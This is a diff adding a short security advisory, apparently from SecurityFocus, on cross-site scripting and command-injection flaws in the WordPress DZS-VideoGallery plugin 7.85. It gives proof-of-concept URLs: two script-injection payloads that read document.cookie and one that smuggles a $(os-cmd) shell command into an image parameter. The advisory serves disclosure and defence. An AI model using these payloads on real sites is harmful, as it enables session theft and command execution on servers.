@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/68525/info
+
+WordPress DZS-VideoGallery plugin is prone to multiple cross site scripting vulnerabilities and a command-injection vulnerability.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site and to execute arbitrary OS commands. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+DZS-VideoGallery 7.85 is vulnerable; prior versions are also affected. 
+
+Cross-site-scripting:
+
+http://www.example.com/wp-content/plugins/dzs-videogallery/deploy/designer/preview.php?swfloc=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+http://www.example.com/wp-content/plugins/dzs-videogallery/deploy/designer/preview.php?designrand=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+Command-Injection:
+
+http://www.example.com/wp-content/plugins/dzs-videogallery/img.php?webshot=1&src=http://www.example.com/1.jpg$(os-cmd) 
